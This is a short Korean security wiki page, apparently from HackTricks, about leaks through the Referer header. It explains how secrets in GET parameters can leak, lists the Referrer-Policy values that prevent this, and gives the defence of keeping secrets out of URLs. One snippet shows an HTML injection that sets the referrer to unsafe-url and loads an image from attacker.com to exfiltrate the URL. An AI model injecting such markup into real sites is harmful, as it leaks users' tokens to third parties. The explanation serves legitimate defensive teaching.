{{#include ./banners/hacktricks-training.md}}

# Referrer headers and policy

Referrer는 브라우저가 이전에 방문한 페이지를 나타내기 위해 사용하는 헤더입니다.

## Sensitive information leaked

웹 페이지 내에서 GET 요청 매개변수에 민감한 정보가 포함되어 있는 경우, 페이지에 외부 소스에 대한 링크가 포함되어 있거나 공격자가 사용자가 공격자가 제어하는 URL을 방문하도록 만들거나 제안할 수 있는 경우(소셜 엔지니어링). 최신 GET 요청 내의 민감한 정보를 유출할 수 있습니다.

## Mitigation

브라우저가 민감한 정보가 다른 웹 애플리케이션으로 전송되는 것을 **피할 수 있는** **Referrer-policy**를 따르도록 설정할 수 있습니다:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Counter-Mitigation

이 규칙은 HTML 메타 태그를 사용하여 무시할 수 있습니다(공격자는 HTML 주입을 이용해야 합니다):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 방어

절대 GET 매개변수나 URL 경로에 민감한 데이터를 넣지 마십시오.

{{#include ./banners/hacktricks-training.md}}
